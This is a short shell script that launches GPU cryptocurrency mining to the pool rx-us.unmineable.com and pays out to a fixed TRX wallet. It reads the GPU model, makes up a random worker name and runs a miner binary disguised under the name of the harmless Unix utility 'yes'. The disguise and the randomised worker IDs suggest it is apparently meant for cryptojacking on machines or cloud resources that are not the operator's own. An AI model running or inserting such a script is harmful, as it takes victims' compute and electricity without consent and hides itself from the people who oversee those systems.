POOL=rx-us.unmineable.com:3333
WALLET=TRX:TAdhoVFpDrRtSuQQHFnLbG6eHwTc25yxxj
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo XN7K96wt-$(shuf -i 1911-889799 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
